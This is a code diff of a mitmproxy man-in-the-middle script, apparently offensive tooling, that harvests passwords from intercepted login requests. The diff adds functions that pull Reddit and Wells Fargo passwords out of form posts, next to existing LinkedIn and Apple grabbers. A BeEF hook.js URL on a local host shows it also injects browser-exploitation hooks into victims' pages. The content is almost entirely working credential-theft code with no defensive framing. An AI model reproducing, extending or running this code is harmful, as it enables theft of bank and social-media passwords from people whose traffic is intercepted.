@@ -6,10 +6,8 @@ from mitmproxy.models import decoded
 class Get_Pwords:
 	'''
 		TO DO:
-		add Pandora
 		add tumblr
-		add reddit
-		
+		q
 	'''
 	def __init__(self, uid):
 		self.iframe_url = "https://192.168.3.1:3000/hook.js"
@@ -25,7 +23,7 @@ class Get_Pwords:
 			
 		
 	def get_linkedin(self,form, flow):
-		if "linkedin.com" in flow.request.headers['Host'] and form['session_password']:
+		if "linkedin.com" in flow.request.headers[':authority'] and form['session_password']:
 			print("account: Linkedin, password:", form['session_password'])
 			return self.interface.read_traffic("linkedin", form["session_password"])
 		else:
@@ -94,6 +92,24 @@ class Get_Pwords:
 		else:
 			pass
 
+	def get_reddit(self, form, flow):
+		if form['op'] and form['user'] and 'www.reddit.' in flow.request.headers[':authority']:
+			print("account: reddit, password:", form['passwd'])
+			return self.interface.read_traffic("reddit", form['passwd'])
+		else:
+			pass
+
+	def get_wellsfargo(self, form, flow):
+		'''
+			interesting: Well's Fargo is the only site out of those tested that changes the 
+			name of form params, specifically username and other metadata, per login request. This would make getting username and passwords 
+			more difficult to pick out the username from the request body. Password is always j_password though.
+		'''
+		if form['j_password'] and "secure.wellsfargo.com" in flow.request.headers["Host"]:
+			return self.interface.read_traffic("wellsfargo", form['j_password'])
+		else:
+			pass
+
 	def beef_hook(self, flow):
 		if flow.request.host in self.iframe_url:
 			return #so we don't inject into the hook itself
@@ -153,6 +169,15 @@ class Get_Pwords:
 				self.get_apple(form, flow)
 			except KeyError as ke:
 				pass
+			try:
+				self.get_reddit(form, flow)
+			except KeyError as ke:
+				pass
+			try:
+				self.get_wellsfargo(form, flow)
+			except KeyError as ke:
+				pass
+
 
 
 
